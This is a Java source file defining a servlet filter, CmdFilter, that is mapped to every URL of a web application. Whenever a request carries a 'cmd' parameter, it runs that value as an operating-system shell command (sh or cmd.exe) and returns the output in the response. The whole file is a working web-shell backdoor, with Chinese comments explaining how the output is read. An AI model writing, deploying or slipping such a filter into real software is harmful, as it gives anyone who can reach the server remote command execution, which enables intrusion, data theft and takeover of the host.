package a;

import javax.servlet.*; // //apache-tomcat-7.0.79\lib\servlet-api.jar
import javax.servlet.annotation.WebFilter;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

//@javax.servlet.annotation.WebFilter(filterName = "CmdFilter")
@WebFilter("/*")
public class CmdFilter implements javax.servlet.Filter {
    public void destroy() {
    }

    public void doFilter(javax.servlet.ServletRequest req, javax.servlet.ServletResponse resp, javax.servlet.FilterChain chain) throws javax.servlet.ServletException, IOException {
        //HttpServletRequest req1 = (HttpServletRequest) req;
        //HttpServletResponse resp1 = (HttpServletResponse) resp;
        if (req.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            //Scanner通过用户回车进行读取IO流,然后扫描是否有分隔符,如果没有,那么继续等待下一段IO流.
            Scanner s = new Scanner(in).useDelimiter("\\A");  //设置当前scanner的分隔符,默认是空格,正则表达式"\\A"跟"^"的作用是一样的，代表文本的开头。
            String output = s.hasNext() ? s.next() : "";
            resp.getWriter().write(output);
            resp.getWriter().flush();
        }

        chain.doFilter(req, resp);
    }

    public void init(javax.servlet.FilterConfig config) throws javax.servlet.ServletException {

    }

}
